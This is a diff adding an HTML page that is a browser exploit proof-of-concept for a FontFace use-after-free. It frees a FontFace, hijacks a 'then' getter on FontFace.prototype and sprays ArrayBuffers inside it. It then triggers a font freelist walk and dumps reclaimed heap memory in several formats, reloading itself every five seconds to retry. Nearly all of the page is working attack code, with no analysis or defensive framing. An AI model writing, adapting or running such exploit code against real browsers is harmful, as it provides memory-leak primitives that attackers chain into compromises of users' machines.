@@ -1,0 +1,147 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p688c: freelist UAF leak via .then</title></head>
+<body style="color:#000;background:#fff;font:12px monospace;padding:8px;">
+<div style="font-size:24px;">p688c: freelist UAF leak via .then</div>
+<div id="log" style="white-space:pre-wrap">LOADING...</div>
+<script>
+(function(){
+  var log=document.getElementById('log');
+  function emit(tag,msg){log.textContent+=tag+': '+msg+'\n';}
+  
+  var loadNo=0;
+  try{var _l=parseInt(localStorage.getItem('p688cloads')||'0',10);loadNo=_l+1;localStorage.setItem('p688cloads',String(loadNo));}catch(e){}
+  emit('LOAD','loadNo='+loadNo);
+  
+  // === STEP 1: Create a single FontFace ===
+  var S='s'+loadNo, F='f'+loadNo;
+  var style=document.createElement('style');
+  style.textContent="@font-face { font-family: "+S+"; src: local(Arial); }";
+  document.head.appendChild(style);
+  var ff=new FontFace(F,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(ff);
+  void ff.loaded;
+  emit('CREATE','fontface created');
+  
+  // === STEP 2: Free the FontFace ===
+  style.remove();
+  try{document.fonts.delete(ff);}catch(e){}
+  document.body.offsetHeight;
+  emit('FREE','fontface freed');
+  
+  // === STEP 3: Define .then getter on FontFace.prototype ===
+  // This will trigger when we access ff.then
+  var uafData=null;
+  
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      emit('GETTER','entered UAF window');
+      
+      // Spray freelist INSIDE getter (after free, before walk)
+      var bufs=[];
+      for(var i=0;i<128;i++){
+        var ab=new ArrayBuffer(128);
+        var v=new Uint8Array(ab);
+        for(var j=0;j<128;j++)v[j]=0;
+        v[0x85]=0xAA;
+        bufs.push(v);
+      }
+      emit('SPRAY','sprayed 128 buffers of 128 bytes, sentinel 0xAA at +0x85');
+      
+      // Trigger freelist walk
+      try{document.fonts.check('1em '+S);}catch(e){}
+      emit('WALK','fonts.check triggered');
+      
+      // Check which buffers were reclaimed
+      var reclaimed=[];
+      for(var i=0;i<bufs.length;i++){
+        if(bufs[i][0x85]!==0xAA){
+          reclaimed.push(i);
+        }
+      }
+      emit('CHECK','reclaimed: '+reclaimed.length+' buffers');
+      
+      if(reclaimed.length>0){
+        // Try to read the reclaimed buffer as 32-bit words
+        var firstIdx=reclaimed[0];
+        var ab=bufs[firstIdx];
+        var view32=new Uint32Array(ab.buffer);
+        var view8=new Uint8Array(ab.buffer);
+        
+        var dump32=[];
+        for(var i=0;i<view32.length;i++){
+          dump32.push('0x'+view32[i].toString(16).padStart(8,'0'));
+        }
+        emit('LEAK-DUMP32','first reclaimed buffer as 32-bit words: '+dump32.join(' '));
+        
+        var dump8=[];
+        for(var i=0;i<Math.min(view8.length,32);i++){
+          dump8.push('0x'+view8[i].toString(16).padStart(2,'0'));
+        }
+        emit('LEAK-DUMP8','first 32 bytes: '+dump8.join(' '));
+        
+        // Try to read as a typed array of different types
+        try{
+          var view16=new Uint16Array(ab.buffer);
+          var dump16=[];
+          for(var i=0;i<view16.length;i++){
+            dump16.push('0x'+view16[i].toString(16).padStart(4,'0'));
+          }
+          emit('LEAK-DUMP16','first 16 words (16-bit): '+dump16.join(' '));
+        }catch(e){emit('LEAK-16-ERR',String(e));}
+        
+        // Try to read as Float32
+        try{
+          var viewF32=new Float32Array(ab.buffer);
+          var dumpF32=[];
+          for(var i=0;i<viewF32.length;i++){
+            dumpF32.push(viewF32[i].toString());
+          }
+          emit('LEAK-DUMP-F32','first 16 floats: '+dumpF32.slice(0,16).join(' '));
+        }catch(e){emit('LEAK-F32-ERR',String(e));}
+        
+        // Try to read as Int32
+        try{
+          var viewI32=new Int32Array(ab.buffer);
+          var dumpI32=[];
+          for(var i=0;i<viewI32.length;i++){
+            dumpI32.push(viewI32[i].toString());
+          }
+          emit('LEAK-DUMP-I32','first 16 ints: '+dumpI32.slice(0,16).join(' '));
+        }catch(e){emit('LEAK-I32-ERR',String(e));}
+        
+        uafData=ab;
+      }else{
+        emit('NO-RECLAIM','no buffers reclaimed');
+      }
+      
+      emit('ALIVE','survived');
+      return undefined;
+    },
+    set:function(){}
+  });
+  
+  // === STEP 4: Trigger the UAF by accessing ff.then ===
+  try{
+    var got=ff.then;
+    if(typeof got==='function'){got();}else{void got;}
+  }catch(e){emit('TRIGGER-ERR',String(e));}
+  emit('TRIGGER','getter triggered');
+  
+  // === STEP 5: Try to read the UAF data ===
+  if(uafData){
+    emit('UAF-READ','attempting to read UAF data');
+    try{
+      var view=new Uint8Array(uafData.buffer);
+      var dump=[];
+      for(var i=0;i<Math.min(view.length,128);i++){
+        dump.push('0x'+view[i].toString(16).padStart(2,'0'));
+      }
+      emit('UAF-DUMP','full 128 bytes: '+dump.join(' '));
+    }catch(e){emit('UAF-READ-ERR',String(e));}
+  }
+  
+  emit('DONE','load='+loadNo);
+  setTimeout(function(){location.reload();},5000);
+})();
+</script>
+</body></html>
